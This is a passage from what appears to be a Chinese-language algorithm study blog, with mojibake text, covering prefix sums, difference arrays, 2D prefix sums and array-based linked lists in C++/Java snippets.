ç”¨x,yæ¨¡æ‹Ÿs[x]-s[y]æ­¤æ—¶åªéœ€è¦éå†xçš„ä½ç½®ã€‚</li></ul><p>[3, 1, 4, 5, 2]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//ç»´æŠ¤å‰ç¼€å’Œçš„å†™æ³•[3, 4, 8, 13, 15]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sums</span><span class="hljs-params">(n)</span></span>;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">s</span><span class="hljs-params">(n<span class="hljs-number">+1</span>)</span></span>; <br>s[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&lt;=n; i++) &#123;<br>    s[i] = s[i<span class="hljs-number">-1</span>] + sums[i<span class="hljs-number">-1</span>]; <br>&#125;<br><br><br><span class="hljs-comment">//preMinå†™æ³•ï¼Œä»å·¦å¾€å³éå†ï¼ŒpreMin[] = [3, 1, 1, 1, 1]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preMin</span><span class="hljs-params">(n)</span></span>;<br>preMin[<span class="hljs-number">0</span>] = s[<span class="hljs-number">0</span>];  <span class="hljs-comment">//è¿™é‡Œçš„sæŒ‡çš„æ˜¯å‰ç¼€å’Œæ•°ç»„</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>    preMin[i] = <span class="hljs-built_in">min</span>(preMin[i<span class="hljs-number">-1</span>], s[i]);   <br>&#125;<br><br><br><span class="hljs-comment">//preMaxå†™æ³•ï¼Œä»å·¦å¾€å³éå†ï¼ŒpreMax[] = [3, 3, 4, 5, 5]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preMax</span><span class="hljs-params">(n)</span></span>;<br>preMax[<span class="hljs-number">0</span>] = s[<span class="hljs-number">0</span>];  <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>    preMax[i] = <span class="hljs-built_in">max</span>(preMax[i<span class="hljs-number">-1</span>], s[i]);  <br>&#125;<br><br><span class="hljs-comment">//sufMin çš„å†™æ³•ï¼Œä»å³å¾€å·¦éå†ï¼ŒsufMin[] = [1, 1, 2, 2, 2]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sufMin</span><span class="hljs-params">(n)</span></span>;<br>sufMin[n<span class="hljs-number">-1</span>] = s[n<span class="hljs-number">-1</span>]; <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    sufMin[i] = <span class="hljs-built_in">min</span>(sufMin[i + <span class="hljs-number">1</span>], s[i]);  <br>&#125;<br><br><span class="hljs-comment">//sufMax çš„å†™æ³•ï¼Œä»å³å¾€å·¦éå†ï¼ŒsufMax[] = [5, 5, 5, 5, 2]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sufMax</span><span class="hljs-params">(n)</span></span>;<br>sufMax[n<span class="hljs-number">-1</span>] = s[n<span class="hljs-number">-1</span>];  <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    sufMax[i] = <span class="hljs-built_in">max</span>(sufMax[i + <span class="hljs-number">1</span>], s[i]); <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€è·¯</strong>ï¼šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‰ç¼€å’Œå°†é—®é¢˜è½¬æ¢ä¸ºå¯»æ‰¾æ»¡è¶³æ¡ä»¶çš„åŒºé—´ï¼Œé€šè¿‡è®°å½•å‰ç¼€å’Œçš„å˜åŒ–ï¼Œä½¿ç”¨å“ˆå¸Œè¡¨æ¥é«˜æ•ˆè§£å†³é—®é¢˜ã€‚æ‰€ä»¥åªéœ€ç”¨ä¸€ä¸ªè®¡æ•°æ•°ç»„æˆ– hash map ç»´æŠ¤Sä¸­æ¯ä¸ªå€¼çš„ä¸ªæ•°ï¼Œæšä¸¾å³ç«¯ç‚¹ iï¼Œçœ‹ä¸€ä¸‹ç­‰äºS[i]-k çš„å€¼æœ‰å‡ ä¸ªå°±è¡Œäº†</p><h4 id="ä¾‹å­-2"><a href="#ä¾‹å­-2" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><h5 id="ä¼˜ç¾å­æ•°ç»„å’Œé—®é¢˜"><a href="#ä¼˜ç¾å­æ•°ç»„å’Œé—®é¢˜" class="headerlink" title="ä¼˜ç¾å­æ•°ç»„å’Œé—®é¢˜"></a>ä¼˜ç¾å­æ•°ç»„å’Œé—®é¢˜</h5><p>å­æ•°ç»„ä¸­çš„å¥‡æ•°ä¸ªæ•°ç­‰äºç»™å®šçš„æ•´æ•° <code>k</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">#include &lt;vector&gt;<br>#include &lt;unordered_map&gt;<br><br>using namespace std;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">numOfSubarrays</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.size();<br>    vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">s</span><span class="hljs-params">(n + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)</span>; <span class="hljs-comment">// å‰ç¼€å’Œæ•°ç»„ s(0-n)ï¼Œåˆå§‹åŒ–ä¸º0</span><br>    unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; count; <span class="hljs-comment">// ç”¨äºè®°å½•å‰ç¼€å’Œå‡ºç°çš„æ¬¡æ•°</span><br>    count[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// åˆå§‹å‰ç¼€å’Œä¸º0æ—¶ï¼Œè®¡æ•°ä¸º1</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">ans</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// è®¡ç®—å‰ç¼€å’Œ s[i]ï¼Œå…¶ä¸­ nums[i-1] æ˜¯å½“å‰å…ƒç´ ï¼Œnums[i-1] % 2 ç”¨äºåˆ¤æ–­å¥‡å¶æ€§</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        s[i] = s[i - <span class="hljs-number">1</span>] + nums[i - <span class="hljs-number">1</span>] % <span class="hljs-number">2</span>; <span class="hljs-comment">// å‰ç¼€å’Œçš„å¥‡å¶æ€§è®¡ç®—</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (s[i] - k &gt;= <span class="hljs-number">0</span>) &#123;<br>            ans += count[s[i] - k]; <span class="hljs-comment">// å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œç´¯åŠ å‡ºç°çš„æ¬¡æ•°</span><br>        &#125;<br>        count[s[i]]++; <span class="hljs-comment">// æ›´æ–°å½“å‰å‰ç¼€å’Œå‡ºç°çš„æ¬¡æ•°</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>è§£æï¼šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‰ç¼€å’Œå°†é—®é¢˜è½¬æ¢ä¸ºå¯»æ‰¾æ»¡è¶³æ¡ä»¶çš„åŒºé—´ï¼Œé€šè¿‡è®°å½•å‰ç¼€å’Œçš„å˜åŒ–ï¼Œä½¿ç”¨å“ˆå¸Œè¡¨æ¥é«˜æ•ˆè§£å†³é—®é¢˜ã€‚æ‰€ä»¥åªéœ€ç”¨ä¸€ä¸ªè®¡æ•°æ•°ç»„æˆ– hash map ç»´æŠ¤Sä¸­æ¯ä¸ªå€¼çš„ä¸ªæ•°ï¼Œæšä¸¾å³ç«¯ç‚¹ iï¼Œçœ‹ä¸€ä¸‹ç­‰äºS[i]-k çš„å€¼æœ‰å‡ ä¸ªå°±è¡Œäº†</p><h5 id="æœ€å¤§å­æ•°ç»„å’Œé—®é¢˜"><a href="#æœ€å¤§å­æ•°ç»„å’Œé—®é¢˜" class="headerlink" title="æœ€å¤§å­æ•°ç»„å’Œé—®é¢˜"></a>æœ€å¤§å­æ•°ç»„å’Œé—®é¢˜</h5><p>é—®é¢˜æè¿°ï¼šç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œè¦æ±‚æ‰¾åˆ°å…¶æœ€å¤§å­æ•°ç»„çš„å’Œã€‚å­æ•°ç»„çš„å®šä¹‰æ˜¯æ•°ç»„ä¸­è¿ç»­çš„ä¸€éƒ¨åˆ†å…ƒç´ ã€‚</p><p><strong>æ€è·¯</strong>ï¼š</p><p>å¯ä»¥é€šè¿‡å‰ç¼€å’Œçš„æ–¹å¼æ¥æ±‚è§£æœ€å¤§å­æ•°ç»„å’Œé—®é¢˜ã€‚</p><p>åŒæ—¶æˆ‘ä»¬éœ€è¦ä¸€ä¸ª <code>preMin</code> æ•°ç»„æ¥è®°å½•å½“å‰å­æ•°ç»„çš„å‰ç¼€å’Œä¸­çš„æœ€å°å€¼ï¼Œä»¥ä¾¿åœ¨å½“å‰åŒºé—´è¿›è¡Œå‡æ³•æ“ä½œæ—¶ï¼Œè·å¾—å¯èƒ½çš„æœ€å¤§å­æ•°ç»„å’Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxSubArray</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;<br>    <span class="hljs-type">int</span>[] s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n+<span class="hljs-number">1</span>]; <span class="hljs-comment">// å‰ç¼€å’Œæ•°ç»„</span><br>    <span class="hljs-type">int</span>[] preMin = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n+<span class="hljs-number">1</span>]; <span class="hljs-comment">// å‰ç¼€æœ€å°å€¼æ•°ç»„</span><br>    s[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        s[i] = s[i-<span class="hljs-number">1</span>] + nums[i-<span class="hljs-number">1</span>]; <span class="hljs-comment">// è®¡ç®—å‰ç¼€å’Œ</span><br>    &#125;<br>    preMin[<span class="hljs-number">0</span>] = s[<span class="hljs-number">0</span>]; <span class="hljs-comment">//preMinä¹¦å†™æ¨¡ç‰ˆ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        preMin[i] = Math.min(preMin[i-<span class="hljs-number">1</span>], s[i]); <span class="hljs-comment">// ç»´æŠ¤å‰ç¼€æœ€å°å€¼</span><br>    &#125;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ans</span> <span class="hljs-operator">=</span> -<span class="hljs-number">10000</span>; <span class="hljs-comment">// åˆå§‹åŒ–ç­”æ¡ˆ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        ans = Math.max(ans, s[i] - preMin[i-<span class="hljs-number">1</span>]); <span class="hljs-comment">// è®¡ç®—æœ€å¤§å­æ•°ç»„å’Œ ä»ä¸€å¼€å§‹</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸€ç»´å·®åˆ†æ•°ç»„"><a href="#ä¸€ç»´å·®åˆ†æ•°ç»„" class="headerlink" title="ä¸€ç»´å·®åˆ†æ•°ç»„"></a>ä¸€ç»´å·®åˆ†æ•°ç»„</h3><p>æ€»ç»“ï¼šæŠŠ Açš„ç¬¬!ä¸ªæ•°åˆ°ç¬¬rä¸ªæ•°åŠ  dï¼ŒB çš„å˜åŒ–ä¸º:B;åŠ  dï¼ŒB,+ å‡dï¼Œå®ƒæ¯”è¾ƒé€‚ç”¨äºæˆ‘ä»¬æƒ³æŠŠä¸€æ®µå„¿-ä¸ªå­æ®µéƒ½åŠ ä¸€ä¸ªå€¼çš„æ—¶å€™ã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³æŠŠaçš„dlåˆ°åº•Iä¸ªæ•°å•Šå•Š|åˆ°rè¿™ä¸ªå­—æ®µéƒ½åŠ ä¸€ä¸ªæ•°dã€‚</p><ul><li><p><strong>å·®åˆ†æ•°ç»„</strong>çš„å¼•å…¥åˆ™ä¸ºé«˜æ•ˆåŒºé—´æ›´æ–°æä¾›äº†ä¸€ç§æ–°çš„æ–¹æ³•ã€‚åœ¨è§£å†³å¤§è§„æ¨¡åŒºé—´æ›´æ–°é—®é¢˜æ—¶ï¼Œå¦‚æœç›´æ¥å¯¹åŸæ•°ç»„è¿›è¡Œæ“ä½œï¼Œæ—¶é—´å¤æ‚åº¦ä¼šæ¯”è¾ƒé«˜ï¼Œè€Œå·®åˆ†æ•°ç»„é€šè¿‡è®°å½•ç›¸é‚»å…ƒç´ ä¹‹é—´çš„å·®å€¼ï¼Œåœ¨å¸¸æ•°æ—¶é—´å†…æ›´æ–°åŒºé—´ï¼Œæœ€åé€šè¿‡å‰ç¼€å’Œæ¢å¤åŸæ•°ç»„ã€‚</p></li><li><p>ä¾‹å¦‚ï¼Œåœ¨èˆªç­é¢„å®šé—®é¢˜ä¸­ï¼Œå·®åˆ†æ•°ç»„ <code>id</code> è¢«ç”¨æ¥è®°å½•æ¯ä¸ªåŒºé—´çš„å˜åŒ–é‡ï¼Œæœ€ç»ˆé€šè¿‡å‰ç¼€å’Œæ¢å¤é¢„å®šåçš„èˆªç­ä¹˜å®¢æ•°é‡ã€‚</p></li><li><p>å·®åˆ†æ•°ç»„çš„æœ¬è´¨æ˜¯é€šè¿‡å¯¹å±€éƒ¨å˜åŒ–çš„è®°å½•å’Œç´¯ç§¯ï¼Œä½¿å¾—åŒºé—´æ›´æ–°å¯ä»¥åœ¨ O(1) æ—¶é—´å†…å®Œæˆï¼Œæå¤§ä¼˜åŒ–äº†éœ€è¦é¢‘ç¹è¿›è¡Œæ›´æ–°æ“ä½œçš„åœºæ™¯ã€‚</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++">å®‡èˆªç¥¨é¢„å®š<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">book</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; bookings, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">id</span><span class="hljs-params">(n + <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; booking : bookings) &#123;<br>            <span class="hljs-type">int</span> a = booking[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> b = booking[<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> c = booking[<span class="hljs-number">2</span>];<br>            id[a] += c;<br>            id[b + <span class="hljs-number">1</span>] -= c;<br>        &#125;<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sum</span><span class="hljs-params">(n + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            sum[i] = sum[i - <span class="hljs-number">1</span>] + id[i];<br>        &#125;<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">answer</span><span class="hljs-params">(n, <span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            answer[i - <span class="hljs-number">1</span>] = sum[i];<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> answer;<br>    &#125;<br><br></code></pre></td></tr></table></figure><h3 id="äºŒç»´å‰ç¼€å’Œ"><a href="#äºŒç»´å‰ç¼€å’Œ" class="headerlink" title="äºŒç»´å‰ç¼€å’Œ"></a>äºŒç»´å‰ç¼€å’Œ</h3><ul><li><p>åœ¨æœ¬éƒ¨åˆ†çš„ç¬”è®°ä¸­ï¼Œå‰ç¼€å’Œçš„æ¦‚å¿µè¢«æ¨å¹¿åˆ°äº†äºŒç»´æƒ…å†µã€‚äºŒç»´å‰ç¼€å’Œ <code>S[i][j]</code> è¡¨ç¤ºçš„æ˜¯ä»çŸ©é˜µå·¦ä¸Šè§’ <code>(1, 1)</code> åˆ°å½“å‰åæ ‡ <code>(i, j)</code> çš„æ‰€æœ‰å…ƒç´ çš„ç´¯åŠ å’Œï¼Œè¿™ä¸€æ¦‚å¿µè®©æˆ‘ä»¬èƒ½å¤Ÿå¿«é€Ÿè®¡ç®—ä»»æ„çŸ©å½¢åŒºåŸŸå†…çš„å…ƒç´ å’Œã€‚</p></li><li><p>ç±»ä¼¼äºä¸€ç»´å‰ç¼€å’Œçš„åŒºé—´å’Œå…¬å¼ï¼ŒäºŒç»´å‰ç¼€å’Œçš„çŸ©å½¢åŒºåŸŸå’Œé€šè¿‡å‰ç¼€å’Œæ•°ç»„å¿«é€Ÿæ±‚è§£ï¼Œé¿å…äº†é‡å¤è®¡ç®—ã€‚è®¡ç®—åŒºåŸŸ <code>(p, q)</code> åˆ° <code>(i, j)</code> çš„çŸ©å½¢åŒºåŸŸå’Œçš„å…¬å¼ä¸ºï¼š</p><ul><li><code>sum(p, q, i, j) = S[i][j] - S[i][q-1] - S[p-1][j] + S[p-1][q-1]</code></li></ul></li><li><p>è¿™ç§æ–¹å¼ä¸ä»…èƒ½å¿«é€Ÿå¤„ç†é—®é¢˜ï¼Œè¿˜èƒ½æå‡ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼Œå°¤å…¶é€‚åˆå¤„ç†è¾ƒå¤§è§„æ¨¡çš„çŸ©é˜µæ±‚å’Œé—®é¢˜ã€‚</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">äºŒç»´åŒºåŸŸçš„å’Œ<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">NumMatrix</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] matrix)</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = matrix.length;<br>    <span class="hljs-type">int</span> m = matrix[<span class="hljs-number">0</span>].length;<br>    sum = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n + <span class="hljs-number">1</span>][m + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= m; j++) &#123;<br>            sum[i][j] = sum[i - <span class="hljs-number">1</span>][j] + sum[i][j - <span class="hljs-number">1</span>] - sum[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + matrix[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">sumRegion</span><span class="hljs-params">(<span class="hljs-type">int</span> row1, <span class="hljs-type">int</span> col1, <span class="hljs-type">int</span> row2, <span class="hljs-type">int</span> col2)</span> </span>&#123;<br>    row1 += <span class="hljs-number">1</span>;<br>    col1 += <span class="hljs-number">1</span>;<br>    row2 += <span class="hljs-number">1</span>;<br>    col2 += <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> sum[row2][col2] - sum[row1 - <span class="hljs-number">1</span>][col2] - sum[row2][col1 - <span class="hljs-number">1</span>] + sum[row1 - <span class="hljs-number">1</span>][col1 - <span class="hljs-number">1</span>];<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="äºŒç»´å·®åˆ†æ•°ç»„"><a href="#äºŒç»´å·®åˆ†æ•°ç»„" class="headerlink" title="äºŒç»´å·®åˆ†æ•°ç»„"></a>äºŒç»´å·®åˆ†æ•°ç»„</h3><hr><h2 id="å››-è¿›åˆ¶è½¬æ¢"><a href="#å››-è¿›åˆ¶è½¬æ¢" class="headerlink" title="å››.è¿›åˆ¶è½¬æ¢"></a>å››.è¿›åˆ¶è½¬æ¢</h2><hr><h2 id="äº”-æ‰¾è§„å¾‹èƒ½åŠ›"><a href="#äº”-æ‰¾è§„å¾‹èƒ½åŠ›" class="headerlink" title="äº”.æ‰¾è§„å¾‹èƒ½åŠ›"></a>äº”.æ‰¾è§„å¾‹èƒ½åŠ›</h2><hr><h2 id="å…­-é“¾è¡¨"><a href="#å…­-é“¾è¡¨" class="headerlink" title="å…­.é“¾è¡¨"></a>å…­.é“¾è¡¨</h2><p>ç›´æ¥é“¾è¡¨å®ç°è¿‡äºæµªè´¹ï¼Œæˆ‘ä»¬ä¸€èˆ¬é€šè¿‡æ•°ç»„æ¥æ¨¡æ‹Ÿé“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// headå­˜å‚¨é“¾è¡¨å¤´ï¼Œe[]å­˜å‚¨èŠ‚ç‚¹çš„å€¼ï¼Œne[]å­˜å‚¨èŠ‚ç‚¹çš„nextæŒ‡é’ˆï¼Œidxè¡¨ç¤ºå½“å‰ç”¨åˆ°äº†å“ªä¸ªèŠ‚ç‚¹</span><br><span class="hljs-type">int</span> head, e[N], ne[N], idx;<br><span class="hljs-comment">// åˆå§‹åŒ–</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    head = <span class="hljs-number">-1</span>;<br>    idx = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// åœ¨é“¾è¡¨å¤´æ’å…¥ä¸€ä¸ªæ•°a</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>    e[idx] = a, ne[idx] = head, head = idx ++ ;<br>&#125;<br><span class="hljs-comment">// å°†å¤´ç»“ç‚¹åˆ é™¤ï¼Œéœ€è¦ä¿è¯å¤´ç»“ç‚¹å­˜åœ¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span>&#123;<br>    head = ne[head];<br>&#125;<br><span class="hljs-comment">// åœ¨ç¬¬kä¸ªä½ç½®æ’å…¥ä¸€ä¸ªæ•°a (kæ˜¯ä»1å¼€å§‹çš„)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insertAt</span><span class="hljs-params">(<span class="hljs-type">int</span> k, <span class="hljs-type">int</span> a)</span> &#123;<br>    <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>        insert(a);  <span class="hljs-comment">// å¦‚æœæ˜¯æ’å…¥å¤´éƒ¨ï¼Œç›´æ¥è°ƒç”¨æ’å…¥å¤´éƒ¨çš„å‡½æ•°</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> cur = head;<br>    <span class="hljs-comment">// æ‰¾åˆ°ç¬¬k-1ä¸ªèŠ‚ç‚¹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; k - <span class="hljs-number">1</span> &amp;&amp; cur != <span class="hljs-number">-1</span>; i++) &#123;<br>        cur = ne[cur];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// å¦‚æœkè¶…å‡ºäº†é“¾è¡¨çš„èŒƒå›´</span><br>    e[idx] = a;<br>    ne[idx] = ne[cur];  <span 